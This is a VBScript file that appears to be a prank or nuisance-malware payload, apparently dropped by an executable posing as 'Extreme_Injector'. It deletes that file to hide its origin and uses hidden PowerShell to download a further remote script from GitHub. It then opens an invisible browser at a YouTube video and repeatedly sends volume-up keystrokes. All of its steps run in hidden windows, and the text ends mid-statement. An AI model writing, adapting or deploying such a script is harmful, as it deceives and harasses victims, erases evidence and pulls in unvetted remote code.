Set wshShell = CreateObject("WScript.shell")
Set oShell = CreateObject("WScript.Shell") 
oShell.run ("cmd.exe /c del /s c:\Extreme_Injector.exe"), 0, True
Dim ie, ipf
Dim x
x=1

Wscript.Sleep 30000

oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/calebpmiller/Files/master/Disco_Keys.vbs','C:\temp\dk.vbs')"), 0, True


Set ie = CreateObject("InternetExplorer.Application")
 
Sub WaitForLoad   
Do While IE.Busy


Do Until x=5000
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
WshShell.SendKeys(chr(175))
Wscript.Sleep 500
x=x+1
Loop

WScript.Sleep 500
Loop
End Sub
 
ie.Left = 0
ie.Top = 0
ie.Toolbar = 0
ie.StatusBar = 0
ie.Height = 2040
ie.Width = 2040
ie.Resizable = 0
 
ie.Navigate "https://www.youtube.com/watch?v=ew_oKrjAq5s"

 
Call WaitForLoad 
 
ie.Visible = False
 
ie.Document.All.Item("")